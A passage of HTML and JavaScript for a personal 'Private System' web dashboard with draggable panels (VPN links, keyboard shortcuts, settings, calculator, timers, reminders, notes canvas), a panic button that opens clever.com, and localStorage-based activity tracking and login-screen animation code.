          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🔐 VPN Websites</h2>
        <div class="links-list" role="list">
          <a href="https://example-vpn1.com" target="_blank" role="listitem">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank" role="listitem">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank" role="listitem">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank" role="listitem">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>⚙️ Settings</h2>
        <ul>
          <li role="menuitem">
            <span>Dashboard Theme:</span>
            <select id="themeSelect" aria-label="Select dashboard theme">
                <option value="dark-theme">Dark</option>
                <option value="light-theme">Light</option>
                <option value="blue-theme">Blue Accent</option>
            </select>
          </li>
          <li role="menuitem"><span>Toggle Announcements:</span> <label class="switch" role="switch" aria-label="Toggle announcement bar visibility"><input type="checkbox" id="toggleAnnouncements"><span class="slider"></span></label></li>
          <li role="menuitem"><span>Show Panel Drag Handles:</span> <label class="switch" role="switch" aria-label="Toggle panel drag and resize handles visibility"><input type="checkbox" id="toggleDragHandles" checked><span class="slider"></span></label></li>
          <li role="menuitem"><span>Display Welcome Notification:</span> <label class="switch" role="switch" aria-label="Toggle welcome notification on login"><input type="checkbox" id="toggleWelcomeNotification" checked><span class="slider"></span></label></li>
          <li role="menuitem"><span>Clear Session Data (dummy):</span> <button class="small-btn" onclick="showNotification('Cleared session data (dummy).')" title="Clear simulated session data">Clear</button></li>
          <li role="menuitem"><span>Reset Dashboard Layout:</span> <button class="small-btn" id="resetLayoutBtn" title="Reset all panel positions and sizes">Reset</button></li>
          <li role="menuitem"><span>Auto Logout Inactive (mins):</span> <input type="number" id="autoLogoutInactive" placeholder="e.g. 30" aria-label="Set auto logout time in minutes"></li>
          <li role="menuitem"><span>Enable Keyboard Shortcuts:</span> <label class="switch" role="switch" aria-label="Enable custom keyboard shortcuts"><input type="checkbox" id="enableKeyboardShortcuts" checked><span class="slider"></span></label></li>
          <li role="menuitem"><span>Notification Sound (dummy):</span> <label class="switch" role="switch" aria-label="Enable notification sounds"><input type="checkbox" id="notificationSound"><span class="slider"></span></label></li>
          <li role="menuitem"><span>Advanced Logging (dummy):</span> <label class="switch" role="switch" aria-label="Enable advanced system logging"><input type="checkbox" id="advancedLogging"><span class="slider"></span></label></li>
          <li role="menuitem"><span>Performance Mode (dummy):</span> <label class="switch" role="switch" aria-label="Enable performance mode"><input type="checkbox" id="performanceMode"><span class="slider"></span></label></li>
          <li role="menuitem"><span>Proxy Mode (requires refresh):</span> <label class="switch" role="switch" aria-label="Enable proxy mode"><input type="checkbox" id="proxyMode"><span class="slider"></span></label></li>
          <li role="menuitem"><span>Debug Mode (dummy):</span> <label class="switch" role="switch" aria-label="Enable debug mode"><input type="checkbox" id="debugMode"><span class="slider"></span></label></li>
          <li role="menuitem"><span>API Endpoint:</span> <input type="text" id="apiEndpoint" value="/api/v1" aria-label="Configure API endpoint" title="API Endpoint (dummy)"></li>
          <li role="menuitem"><span>Data Retention (days):</span> <input type="number" id="dataRetention" value="30" min="1" aria-label="Configure data retention period" title="Data Retention (dummy)"></li>
          <li role="menuitem"><span>About:</span> <button class="small-btn" onclick="alert('Private System GUI v1.5.6\\nDeveloped for advanced users.')" title="View application information">View Info</button></li>
          <li role="menuitem"><span>Help & Support:</span> <button class="small-btn" onclick="alert('Contact admin@privatesystem.org')" title="Get help and support">Get Help</button></li>
          <li role="menuitem"><span>Feedback:</span> <button class="small-btn" onclick="prompt('Enter your feedback:', '')" title="Send feedback">Send Feedback</button></li>
        </ul>
      </div>

      <!-- Keybinds Panel -->
      <div id="keybindsPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>⌨️ Keybinds Configuration</h2>
        <p>Define custom keyboard shortcuts for quick actions.</p>
        <ul>
          <li role="menuitem"><span>Toggle Notes:</span> <input type="text" value="Ctrl + Alt + N" placeholder="e.g. Ctrl + S" data-keybind-action="toggleNotes" aria-label="Keybind for toggling notes panel"></li>
          <li role="menuitem"><span>Panic Button:</span> <input type="text" value="Shift + Escape" placeholder="e.g. F12" data-keybind-action="panic" aria-label="Keybind for panic button"></li>
          <li role="menuitem"><span>Toggle Sections:</span> <input type="text" value="Ctrl + Space" placeholder="e.g. F2" data-keybind-action="toggleSections" aria-label="Keybind for toggling main dashboard sections"></li>
          <li role="menuitem"><span>Open Calculator:</span> <input type="text" value="Ctrl + Alt + C" placeholder="e.g. Ctrl + C" data-keybind-action="openCalculator" aria-label="Keybind for opening calculator"></li>
          <li role="menuitem"><span>Open Settings:</span> <input type="text" value="Ctrl + ," placeholder="e.g. Ctrl + ," data-keybind-action="openSettings" aria-label="Keybind for opening settings panel"></li>
          <li role="menuitem"><span>Toggle Fullscreen:</span> <input type="text" value="F11" placeholder="e.g. F11" data-keybind-action="toggleFullscreen" aria-label="Keybind for toggling fullscreen mode"></li>
          <li role="menuitem"><span>Reload Page:</span> <input type="text" value="Ctrl + R" placeholder="e.g. Ctrl + R" data-keybind-action="reloadPage" aria-label="Keybind for reloading the page"></li>
        </ul>
        <button id="saveKeybindsBtn" style="margin-top: 20px;" title="Save configured keybinds">Save Keybinds</button>
        <p style="font-size: 0.8em; color: #ccc; margin-top: 10px;">To define, click an input then press desired key combination. Release to set.</p>
      </div>

      <!-- Utilities Panel -->
      <div id="utilitiesPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>⏱️ Utilities (Timer & Stopwatch)</h2>
        <h3>Stopwatch</h3>
        <p style="font-size:1.5em; font-weight:bold;" aria-label="Stopwatch time">Time: <span id="stopwatchDisplay">00:00:00</span></p>
        <button id="stopwatchStart" title="Start stopwatch">Start</button>
        <button id="stopwatchStop" title="Stop stopwatch">Stop</button>
        <button id="stopwatchReset" title="Reset stopwatch">Reset</button>
        <h3 style="margin-top: 20px;">Countdown Timer</h3>
        <div style="display: flex; gap: 5px; justify-content: center; align-items: center; margin-bottom: 10px;">
          <input type="number" id="timerMinutes" placeholder="Minutes" value="5" min="0" max="999" style="width: 80px; text-align: right;" aria-label="Timer minutes">
          <span>:</span>
          <input type="number" id="timerSeconds" placeholder="Seconds" value="0" min="0" max="59" style="width: 80px; text-align: left;" aria-label="Timer seconds">
        </div>
        <p style="font-size:1.5em; font-weight:bold;" aria-label="Time remaining on countdown timer">Time Left: <span id="timerDisplay">00:05:00</span></p>
        <button id="timerStart" title="Start countdown timer">Start</button>
        <button id="timerStop" title="Stop countdown timer">Stop</button>
        <button id="timerReset" title="Reset countdown timer">Reset</button>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🧮 Calculator</h2>
        <div class="calculator-grid" role="group" aria-label="Calculator controls">
            <div class="calculator-display" id="calcDisplay" aria-live="polite">0</div>
            <button onclick="calculator.clear()" aria-label="All clear">AC</button>
            <button onclick="calculator.deleteLast()" aria-label="Delete last entry">DEL</button>
            <button class="operator" onclick="calculator.appendOp('%')" aria-label="Modulo">%</button>
            <button class="operator" onclick="calculator.appendOp('/')" aria-label="Divide">÷</button>
            <button onclick="calculator.appendNum('7')">7</button>
            <button onclick="calculator.appendNum('8')">8</button>
            <button onclick="calculator.appendNum('9')">9</button>
            <button class="operator" onclick="calculator.appendOp('*')" aria-label="Multiply">×</button>
            <button onclick="calculator.appendNum('4')">4</button>
            <button onclick="calculator.appendNum('5')">5</button>
            <button onclick="calculator.appendNum('6')">6</button>
            <button class="operator" onclick="calculator.appendOp('-')" aria-label="Subtract">-</button>
            <button onclick="calculator.appendNum('1')">1</button>
            <button onclick="calculator.appendNum('2')">2</button>
            <button onclick="calculator.appendNum('3')">3</button>
            <button class="operator" onclick="calculator.appendOp('+')" aria-label="Add">+</button>
            <button onclick="calculator.appendNum('0')">0</button>
            <button onclick="calculator.appendNum('.')">.</button>
            <button class="equal" onclick="calculator.calculate()" aria-label="Equals">=</button>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🔄 Unit Converter</h2>
        <p>Convert:</p>
        <div class="unit-converter-input-group" role="group" aria-label="Unit conversion inputs">
            <input type="number" id="convertFromValue" value="1" aria-label="Value to convert from">
            <select id="convertFromUnit" aria-label="Unit to convert from"></select>
            <span>to</span>
            <select id="convertToUnit" aria-label="Unit to convert to"></select>
        </div>
        <button id="convertBtn" title="Perform conversion">Convert</button>
        <div class="unit-converter-result" id="conversionResult" aria-live="polite">Result: --</div>

        <h3 style="margin-top:20px;">Conversion Type:</h3>
        <select id="conversionType" style="padding: 8px; border-radius: 5px; border: 1px solid #ddd; background: #333; color: white; width: 100%;" aria-label="Select conversion type">
            <option value="length">Length</option>
            <option value="mass">Mass</option>
            <option value="temperature">Temperature</option>
            <option value="volume">Volume</option>
            <option value="area">Area</option>
        </select>
      </div>

      <!-- Stats Panel -->
      <div id="statsPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📈 User Statistics</h2>
        <div id="statsContent" aria-live="polite">
          <p>Total Clicks: <span id="statTotalClicks">0</span></p>
          <p>Buttons Pressed: <span id="statButtonsPressed">0</span></p>
          <p>Toggles Flipped: <span id="statTogglesFlipped">0</span></p>
          <p>Panels Opened: <span id="statPanelsOpened">0</span></p>
          <p>Panels Closed: <span id="statPanelsClosed">0</span></p>
          <p>Notes Saved: <span id="statNotesSaved">0</span></p>
          <p>Screenshots Taken: <span id="statScreenshotsTaken">0</span></p>
          <p>Timer Starts: <span id="statTimerStarts">0</span></p>
          <p>Stopwatch Starts: <span id="statStopwatchStarts">0</span></p>
          <p>Conversions Made: <span id="statConversionsMade">0</span></p>
          <p>Searches Made: <span id="statSearchesMade">0</span></p>
        </div>
        <button id="resetStatsBtn" style="margin-top: 20px; background-color: #f44336;" title="Reset all dashboard statistics">Reset Statistics</button>
      </div>

      <!-- Media Panel -->
      <div id="mediaPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>▶️ Media Hub</h2>
        <p>Please note: Direct proxy integration is not available in this client-side dashboard for security and technical reasons. Links below are direct or embeds.</p>
        <h3>Featured Videos</h3>
        <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px;" role="list">
            <div style="flex: 1 1 300px; min-width: 280px; background: #333; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.3);" role="listitem">
                <iframe width="100%" height="200" src="https://www.youtube.com/embed/dQw4w9WgXcQ?controls=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen title="Classic Rickroll video"></iframe>
                <p style="padding: 10px; font-weight: bold; margin:0;">Classic Rickroll</p>
            </div>
            <div style="flex: 1 1 300px; min-width: 280px; background: #333; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.3);" role="listitem">
                <iframe width="100%" height="200" src="https://www.youtube.com/embed/gU9yP_QkQeQ" frameborder="0" allowfullscreen title="Lo-fi Hip Hop Beats video"></iframe>
                <p style="padding: 10px; font-weight: bold; margin:0;">Lo-fi Hip Hop Beats</p>
            </div>
        </div>
        <h3 style="margin-top: 25px;">Useful YouTube Channels</h3>
        <div class="links-list" role="list">
            <a href="https://www.youtube.com/@freecodecamp" target="_blank" role="listitem">freeCodeCamp.org</a>
            <a href="https://www.youtube.com/@Vsauce" target="_blank" role="listitem">Vsauce</a>
            <a href="https://www.youtube.com/@Kurzgesagt" target="_blank" role="listitem">Kurzgesagt – In a Nutshell</a>
        </div>
      </div>

      <!-- Reminders Panel -->
      <div id="remindersPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>⏰ Reminders</h2>
        <p style="margin-bottom:10px;">Set new reminder:</p>
        <input type="text" id="reminderTextInput" placeholder="e.g., Call mom at 5 PM" style="width: calc(100% - 22px); margin-bottom: 10px;" aria-label="Reminder text input">
        <input type="datetime-local" id="reminderDateTimeInput" style="width: calc(100% - 22px); margin-bottom: 15px;" aria-label="Reminder date and time input">
        <button id="addReminderBtn" title="Add reminder">Add Reminder</button>
        <h3 style="margin-top: 25px;">Your Reminders:</h3>
        <div id="remindersList" aria-live="polite" role="list">
          <p style="color:#aaa; padding: 10px;">No reminders set.</p>
        </div>
      </div>

      <!-- Activity Logs Panel (Dashboard) -->
      <div id="activityLogsDashboardPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>📝 Dashboard Activity Logs</h2>
        <div id="dashboardActivityLogs" aria-live="polite" role="log">
            <p style="color:#aaa; padding: 10px;">No dashboard activity yet.</p>
        </div>
        <button id="clearDashboardLogsBtn" style="margin-top: 15px; background-color: #f44336;" title="Clear all dashboard activity logs">Clear Dashboard Logs</button>
      </div>

      <!-- Login History Panel -->
      <div id="loginHistoryPanel" class="info-panel" data-x="0" data-y="0">
        <div class="panel-handle" title="Drag to move, resize bottom-right">Drag / Resize</div>
        <h2>🔒 Login History</h2>
        <div id="loginHistoryPanelContent" aria-live="polite" role="log">
          <p style="color:#aaa; padding: 10px;">No login history yet.</p>
        </div>
        <button id="clearLoginHistoryBtn" style="margin-top: 15px; background-color: #f44336;" title="Clear all login history">Clear Login History</button>
      </div>


    </div>

    <div id="canvasContainer" role="application" aria-label="Notes Canvas and Controls">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400" aria-label="Drawing canvas"></canvas>
      <div id="canvasControls" role="toolbar" aria-label="Canvas drawing tools">
        <button id="clearCanvasBtn" title="Clear entire canvas">Clear Canvas</button>
        <button id="undoCanvasBtn" title="Undo last drawing stroke">Undo</button>
        <input type="color" id="noteColorPicker" value="#ff914d" aria-label="Select drawing color" title="Drawing Color">
        <input type="range" id="noteThicknessSlider" min="1" max="10" value="2" title="Brush Thickness (1-10)" aria-label="Brush thickness slider">
        <button id="toggleTextNotesBtn" title="Toggle visibility of text notes area">✍️ Toggle Text Notes</button>
        <button id="downloadTextNotesBtn" title="Download text notes as a .txt file">💾 Download Text Notes</button>
        <button id="closeCanvasBtn" title="Close notes panel">Close Notes</button>
      </div>
       <textarea id="textNotesArea" placeholder="Type your text notes here..." style="display: none;" aria-label="Text notes area"></textarea>
    </div>
  </div>

  <script>
    // Constants for local storage keys, improving maintainability
    const LS_LOGIN_HISTORY = 'privateSystemLoginHistory';
    const LS_ACTIVITY_LOGS = 'privateSystemActivityLogs';
    const LS_DASHBOARD_STATS = 'privateSystemDashboardStats';
    const LS_THEME = 'privateSystemTheme';
    const LS_WELCOME_NOTIFICATION_DISPLAY = 'privateSystemWelcomeNotification';
    const LS_DRAG_HANDLES_TOGGLE = 'privateSystemDragHandlesToggle';
    const LS_NOTES_TEXT = 'privateSystemTextNotes';
    const LS_KEYBINDS = 'privateSystemKeybinds';
    const LS_24HR_FORMAT = 'privateSystem24HourFormat';
    const LS_REMINDERS = 'privateSystemReminders';
    const LS_AUTO_LOGOUT_INACTIVE = 'privateSystemAutoLogoutInactive';
    const LS_DASHBOARD_LAYOUT = 'privateSystemDashboardLayout'; // New: for persistent panel layout

    // Global variables for dashboard state and data
    let globalZoomLevel = parseFloat(localStorage.getItem('globalZoomLevel') || '1'); // Persist dashboard zoom
    let is24HourFormat = JSON.parse(localStorage.getItem(LS_24HR_FORMAT) || 'false');
    let activityLogs = JSON.parse(localStorage.getItem(LS_ACTIVITY_LOGS) || '[]');
    let dashboardStats = JSON.parse(localStorage.getItem(LS_DASHBOARD_STATS) || '{}');
    let lastActivityTime = new Date(); // To track user idle time
    let notificationQueue = []; // Queue for managing dashboard notifications
    let notificationTimeout = null;

    // Initial stats setup
    const initialStats = {
        totalClicks: 0, buttonsPressed: 0, togglesFlipped: 0,
        panelsOpened: 0, panelsClosed: 0, notesSaved: 0,
        screenshotsTaken: 0, timerStarts: 0, stopwatchStarts: 0,
        conversionsMade: 0, searchesMade: 0, panelsMoved: 0, panelsResized: 0
    };
    // Merge loaded stats with initial defaults to ensure all fields are present
    dashboardStats = { ...initialStats, ...dashboardStats };


    // --- Helper Functions ---

    // Adds an entry to the activity log and persists to local storage
    function trackActivity(type, description = '') {
        const timestamp = new Date().toLocaleString();
        activityLogs.push({ timestamp, type, description });
        localStorage.setItem(LS_ACTIVITY_LOGS, JSON.stringify(activityLogs));
        renderActivityLogs('loginActivityLogs');
        renderActivityLogs('dashboardActivityLogs');
    }

    // Increments a specific dashboard statistic
    function updateStats(statName, increment = 1) {
        if (dashboardStats[statName] !== undefined) {
            dashboardStats[statName] += increment;
            localStorage.setItem(LS_DASHBOARD_STATS, JSON.stringify(dashboardStats));
            renderDashboardStats(); // Update UI
        } else {
            console.warn(`Attempted to update unknown stat: ${statName}`);
        }
    }

    // Renders activity logs into a specified container
    function renderActivityLogs(elementId) {
      const logContainer = document.getElementById(elementId);
      if (logContainer) {
          logContainer.innerHTML = '';
          const logsToDisplay = (elementId === 'loginActivityLogs') ?
                                  activityLogs.filter(log => log.type.startsWith('LOGIN_') || log.type.startsWith('ERROR')) : // Include errors in login too
                                  activityLogs.filter(log => !log.type.startsWith('LOGIN_') && !log.type.startsWith('ALERT')); // Filter out internal alerts and login-specific logs for dashboard

          // Display newest logs first (reverse chronological order)
          logsToDisplay.slice().reverse().forEach(log => {
              const div = document.createElement('div');
              div.className = 'activity-log-entry';
              div.textContent = `[${log.timestamp}] ${log.description || log.type}`;
              logContainer.appendChild(div);
          });
      }
    }

    // Updates dashboard statistics display in the UI
    function renderDashboardStats() {
      if (document.getElementById('statsContent')) {
          for (const stat in dashboardStats) {
              const element = document.getElementById(`stat${stat.charAt(0).toUpperCase() + stat.slice(1)}`);
              if (element) {
                  element.textContent = dashboardStats[stat];
              }
          }
      }
    }

    // Unified notification/alert system with queueing and dismissible
    function showNotification(message) {
      notificationQueue.push(message);
      processNotificationQueue();
    }

    function processNotificationQueue() {
      if (notificationQueue.length > 0 && !notificationTimeout) {
        const message = notificationQueue.shift();
        const container = document.getElementById('dashboardNotificationsContainer');
        
        const notificationElement = document.createElement('div');
        notificationElement.className = 'dashboard-notification';
        notificationElement.setAttribute('role', 'status');
        notificationElement.setAttribute('aria-live', 'polite');
        notificationElement.setAttribute('aria-atomic', 'true');

        const messageSpan = document.createElement('span');
        messageSpan.textContent = message;
        notificationElement.appendChild(messageSpan);

        const closeBtn = document.createElement('button');
        closeBtn.className = 'close-btn';
        closeBtn.textContent = '✖';
        closeBtn.setAttribute('aria-label', 'Dismiss notification');
        closeBtn.onclick = () => dismissNotification(notificationElement);
        notificationElement.appendChild(closeBtn);

        container.prepend(notificationElement); // Add to top of stack

        // Animate in
        setTimeout(() => {
          notificationElement.classList.add('show');
        }, 100);

        // Track and set timeout for dismissal
        trackActivity('ALERT', message);
        notificationTimeout = setTimeout(() => {
          dismissNotification(notificationElement);
        }, 5000); // Auto-dismiss after 5 seconds
      }
    }

    function dismissNotification(notificationElement) {
      if (!notificationElement) return;

      notificationElement.classList.remove('show');
      notificationElement.addEventListener('transitionend', () => {
        notificationElement.remove();
        if (notificationTimeout) {
            clearTimeout(notificationTimeout);
            notificationTimeout = null;
        }
        processNotificationQueue(); // Check for next notification in queue
      }, { once: true });
    }

    // Global click listener for tracking basic stats
    document.addEventListener('click', (event) => {
        updateStats('totalClicks');
        if (event.target.tagName === 'BUTTON') {
            updateStats('buttonsPressed');
        }
    });

    // Global change listener for tracking toggle stats
    document.addEventListener('change', (event) => {
        // Check for specific type of toggle used for features
        if (event.target.classList.contains('switch') && event.target.tagName === 'INPUT' && event.target.type === 'checkbox') {
            updateStats('togglesFlipped');
            const toggleLabel = event.target.closest('li')?.querySelector('span:first-child')?.textContent.trim() || event.target.id;
            trackActivity('TOGGLE', `Toggled "${toggleLabel}" to ${event.target.checked ? 'ON' : 'OFF'}`);
        }
    });


    // --- Initial Loading Sequence on DOM Ready ---
    document.addEventListener('DOMContentLoaded', () => {
      const initialLoadingScreen = document.getElementById('initialLoadingScreen');
      const loadingText = document.getElementById('loadingText');
      const rotatingBoxFaces = document.querySelectorAll('.rotating-box .face');
      const loginBox = document.getElementById('loginBox');
      const loginDateTimeBox = document.getElementById('loginDateTimeBox');
      const loginQuickBar = document.getElementById('loginQuickBar');

      let currentTypingIndex = 0; // For character-by-character typing effect
      let currentPhase = 0;
      const phases = [
        { text: "Initializing System...", gradient: "linear-gradient(to right, orange, red)", boxBg: "rgba(255, 145, 77, 0.4)", boxBorder: "white", boxShadow: "0 0 10px white" },
        { text: "System Initialized.", gradient: "linear-gradient(to right, limegreen, blue)", boxBg: "rgba(40, 167, 69, 0.4)", boxBorder: "limegreen", boxShadow: "0 0 10px limegreen" }
      ];

      function typeTextEffect(element, fullText, gradient) {
          element.textContent = ''; // Clear existing text
          element.style.backgroundImage = gradient;
          element.classList.remove('typing-text-container'); // Reset animation state
          void element.offsetWidth; // Trigger reflow
          element.classList.add('typing-text-container');
          element.textContent = fullText;
          // Dynamically adjust animation duration based on text length for consistent speed
          element.style.animation = `typing ${fullText.length * 0.05}s steps(${fullText.length}, end) forwards, blinkCaret .75s step-end infinite`;
      }

      function updateLoadingPhase() {
        if (currentPhase < phases.length) {
          const phase = phases[currentPhase];
          typeTextEffect(loadingText, phase.text, phase.gradient);

          rotatingBoxFaces.forEach(face => {
            face.style.background = phase.boxBg;
            face.style.borderColor = phase.boxBorder;
            face.style.boxShadow = phase.boxShadow;
          });
          currentPhase++;
          setTimeout(updateLoadingPhase, (phase.text.length * 50) + 1000); // Wait for typing + brief pause
        } else {
          // All initial phases complete, prepare for login page
          loadingText.classList.remove('typing-text-container'); // Stop caret animation
          loadingText.style.opacity = 0; // Fade out the last text
          rotatingBoxFaces.forEach(face => {
            face.classList.add('face-hidden'); // Hide 3D box faces with transition
          });

          setTimeout(() => {
              initialLoadingScreen.classList.add('hidden'); // Hide the entire initial screen
              initialLoadingScreen.setAttribute('aria-hidden', 'true');
              setTimeout(() => {
                  initialLoadingScreen.style.display = 'none'; // Completely remove after fade out

                  // Show login components and re-enable appropriate body classes
                  document.body.classList.remove('dashboard-body', 'light-theme', 'blue-theme'); // Clear dashboard/theme classes
                  const savedTheme = localStorage.getItem(LS_THEME);
                  if (savedTheme) {
                      document.body.classList.add(savedTheme); // Apply theme for login as well
                  }
                  document.body.classList.add('login-body');

                  loginBox.style.display = 'block';
                  loginDateTimeBox.style.display = 'flex';
                  loginQuickBar.style.display = 'flex';

                  initLoginQuickBar(); // Initialize the quickbar for login screen
                  setupLoginDateTime(); // Set up real-time clock for login screen
                  renderActivityLogs('loginActivityLogs'); // Populate initial login activity logs

                  // Ensure initial password input type is set correctly based on the toggle (off by default)
                  document.getElementById('password').type = document.getElementById('showPassword').checked ? 'text' : 'password';
              }, 800); // Match initialLoadingScreen.hidden transition time
          }, 1500); // Delay before hiding screen, allowing final visual to persist
        }
      }

      // Initial call to start loading phases
      updateLoadingPhase();
      
      // Load 24hr format toggle state for login screen
      const toggle24HourFormatCheckbox = document.getElementById('toggle24HourFormat');
      if (toggle24HourFormatCheckbox) {
          toggle24HourFormatCheckbox.checked = is24HourFormat;
          toggle24HourFormatCheckbox.setAttribute('aria-checked', is24HourFormat.toString());
      }
    });

    let loginPageZoomLevel = 1; // Separate zoom level for the login page

    // Initializes login page quick bar actions (Panic, Zoom)
    function initLoginQuickBar() {
      const loginPanicBtn = document.getElementById('loginPanicBtn');
      const loginZoomInBtn = document.getElementById('loginZoomInBtn');
      const loginZoomOutBtn = document.getElementById('loginZoomOutBtn');
      const zoomStep = 0.1;
      const minZoom = 0.5;
      const maxZoom = 2;

      loginPanicBtn?.addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          trackActivity('LOGIN_PANIC', 'Panic button clicked on login page');
      });

      loginZoomInBtn?.addEventListener('click', () => {
          if (loginPageZoomLevel < maxZoom) {
              loginPageZoomLevel += zoomStep;
              document.body.style.zoom = loginPageZoomLevel;
              trackActivity('LOGIN_ZOOM', `Zoomed in on login page to ${loginPageZoomLevel.toFixed(1)}`);
          }
      });

      loginZoomOutBtn?.addEventListener('click', () => {
          if (loginPageZoomLevel > minZoom) {
              loginPageZoomLevel -= zoomStep;
              document.body.style.zoom = loginPageZoomLevel;
              trackActivity('LOGIN_ZOOM', `Zoomed out on login page to ${loginPageZoomLevel.toFixed(1)}`);
          }
      });
    }

    // Sets up the real-time clock and date display on the login page
    function setupLoginDateTime() {
      const loginCurrentTimeSpan = document.getElementById('loginCurrentTime');
      const loginCurrentDateSpan = document.getElementById('loginCurrentDate');
      const toggle24HourFormat = document.getElementById('toggle24HourFormat');

      function updateLoginClock() {
        const now = new Date();
        const timeOptions = { 
            hour: 'numeric', 
            minute: 'numeric', 
            second: 'numeric', 
            hour12: !is24HourFormat 
        };
        const dateOptions = { 
            month: 'long', 
            day: 'numeric', 
            year: 'numeric' 
        };
        const timeStr = now.toLocaleTimeString(undefined, timeOptions);
        const dateStr = now.toLocaleDateString(undefined, dateOptions);

        if (loginCurrentTimeSpan) loginCurrentTimeSpan.textContent = timeStr;
        if (loginCurrentDateSpan) loginCurrentDateSpan.textContent = dateStr;
      }

      toggle24HourFormat?.addEventListener('change', () => {
        is24HourFormat = toggle24HourFormat.checked;
        localStorage.setItem(LS_24HR_FORMAT, JSON.stringify(is24HourFormat));
        toggle24HourFormat.setAttribute('aria-checked', is24HourFormat.toString());
        updateLoginClock();
        trackActivity('LOGIN_TOGGLE', `24-hour format toggle set to ${is24HourFormat ? 'ON' : 'OFF'}`);
      });

      updateLoginClock(); // Initial call
      setInterval(updateLoginClock, 1000); // Update every second
    }
    
